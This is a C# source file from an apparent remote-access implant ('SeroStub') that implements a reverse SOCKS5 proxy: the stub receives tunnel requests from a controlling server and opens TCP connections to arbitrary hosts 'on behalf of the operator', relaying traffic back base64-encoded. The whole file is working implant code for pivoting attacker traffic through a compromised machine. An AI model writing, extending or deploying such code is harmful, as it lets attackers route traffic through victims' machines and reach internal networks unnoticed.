using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Text.Json;

namespace SeroStub;

// Reverse SOCKS5 — the stub side receives SOCKS5 tunnel data from the server
// and relays it to the real target host on behalf of the operator.
internal static class Socks5Feature
{
    private static readonly ConcurrentDictionary<string, SocksSession> _sessions = new();
    private static Func<string, Task>? _sendData;
    private static Func<string, Task>? _sendClose;
    private static Func<string, string, Task>? _sendConnResult;

    internal static void Init(
        Func<string, Task> sendData,
        Func<string, Task> sendClose,
        Func<string, string, Task> sendConnResult)
    {
        _sendData       = sendData;
        _sendClose      = sendClose;
        _sendConnResult = sendConnResult;
    }

    internal static void StopAll()
    {
        foreach (var s in _sessions.Values) s.Dispose();
        _sessions.Clear();
    }

    // Called when server sends SocksData for a session that doesn't exist yet:
    // first packet is the SOCKS5 connect request.
    internal static async Task HandleConnect(string sessionId, byte[] payload)
    {
        // SOCKS5 CONNECT request: VER(1) CMD(1) RSV(1) ATYP(1) DST DSTPORT(2)
        if (payload.Length < 10 || payload[0] != 5 || payload[1] != 1) // VER=5 CMD=CONNECT; IPv4 needs 10 bytes min
        {
            await (_sendConnResult?.Invoke(sessionId, "Bad SOCKS5 request") ?? Task.CompletedTask);
            return;
        }

        string host;
        int portOffset;
        switch (payload[3]) // ATYP
        {
            case 1: // IPv4
                host = $"{payload[4]}.{payload[5]}.{payload[6]}.{payload[7]}";
                portOffset = 8;
                break;
            case 3: // Domain
                int len = payload[4];
                if (payload.Length < 5 + len + 2)
                {
                    await (_sendConnResult?.Invoke(sessionId, "Bad SOCKS5 domain length") ?? Task.CompletedTask);
                    return;
                }
                host = System.Text.Encoding.ASCII.GetString(payload, 5, len);
                portOffset = 5 + len;
                break;
            case 4: // IPv6
                if (payload.Length < 22)
                {
                    await (_sendConnResult?.Invoke(sessionId, "Bad SOCKS5 IPv6 length") ?? Task.CompletedTask);
                    return;
                }
                host = new System.Net.IPAddress(payload[4..20]).ToString();
                portOffset = 20;
                break;
            default:
                await (_sendConnResult?.Invoke(sessionId, "Unsupported ATYP") ?? Task.CompletedTask);
                return;
        }

        int port = (payload[portOffset] << 8) | payload[portOffset + 1];

        try
        {
            var tcp = new TcpClient();
            await tcp.ConnectAsync(host, port);
            var session = new SocksSession(sessionId, tcp, _sendData!, _sendClose!);
            _sessions[sessionId] = session;
            session.StartReading();
            await (_sendConnResult?.Invoke(sessionId, "") ?? Task.CompletedTask);
        }
        catch (Exception ex)
        {
            await (_sendConnResult?.Invoke(sessionId, ex.Message) ?? Task.CompletedTask);
        }
    }

    internal static async Task HandleData(string sessionId, byte[] data)
    {
        if (_sessions.TryGetValue(sessionId, out var s))
            await s.SendAsync(data);
    }

    internal static void HandleClose(string sessionId)
    {
        if (_sessions.TryRemove(sessionId, out var s))
            s.Dispose();
    }
}

internal sealed class SocksSession : IDisposable
{
    private readonly string    _id;
    private readonly TcpClient _tcp;
    private readonly NetworkStream _stream;
    private readonly Func<string, Task> _sendData;
    private readonly Func<string, Task> _sendClose;
    private int _disposed; // 0=alive, 1=disposed — Interlocked ensures atomic test-and-set

    public SocksSession(string id, TcpClient tcp,
        Func<string, Task> sendData, Func<string, Task> sendClose)
    {
        _id        = id;
        _tcp       = tcp;
        _stream    = tcp.GetStream();
        _sendData  = sendData;
        _sendClose = sendClose;
    }

    public void StartReading() =>
        Task.Run(async () =>
        {
            var buf = new byte[8192];
            try
            {
                while (_disposed == 0)
                {
                    int n = await _stream.ReadAsync(buf);
                    if (n == 0) break;
                    var b64 = Convert.ToBase64String(buf, 0, n);
                    await _sendData(JsonSerializer.Serialize(
                        new SocksDataStub { SessionId = _id, Data = b64 },
                        SeroJson.Default.SocksDataStub));
                }
            }
            catch { }
            finally { await _sendClose(_id); Dispose(); }
        });

    public async Task SendAsync(byte[] data)
    {
        try { await _stream.WriteAsync(data); }
        catch { Dispose(); }
    }

    public void Dispose()
    {
        if (System.Threading.Interlocked.Exchange(ref _disposed, 1) != 0) return;
        try { _stream.Close(); _tcp.Close(); } catch { }
    }
}

internal class SocksDataStub    { public string SessionId { get; set; } = ""; public string Data { get; set; } = ""; }
internal class SocksConnStub    { public string SessionId { get; set; } = ""; public string Error { get; set; } = ""; }
internal class SocksStartStub   { public int LocalPort { get; set; } = 1080; }
